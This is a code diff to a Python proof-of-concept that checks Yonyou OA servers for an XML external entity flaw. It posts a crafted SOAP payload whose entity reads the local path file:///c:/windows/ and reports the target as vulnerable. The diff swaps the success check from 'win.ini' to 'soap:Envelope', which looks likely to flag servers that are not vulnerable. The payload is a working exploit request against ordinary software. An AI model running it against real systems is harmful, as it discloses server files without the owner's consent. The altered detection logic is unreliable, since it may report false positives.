@@ -11,7 +11,7 @@ def poc(target):
         url = target + '/uapws/soapFormat.ajax'
         data = 'msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///c:/windows/"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a'
         req = requests.post(url,headers=headers,data=data)
-        if req.status_code == 200 and 'win.ini' in req.text:
+        if req.status_code == 200 and 'soap:Envelope' in req.text:
             print("\033[0;31m 存在用友oa xxe漏洞："+ url )
     except:
         pass
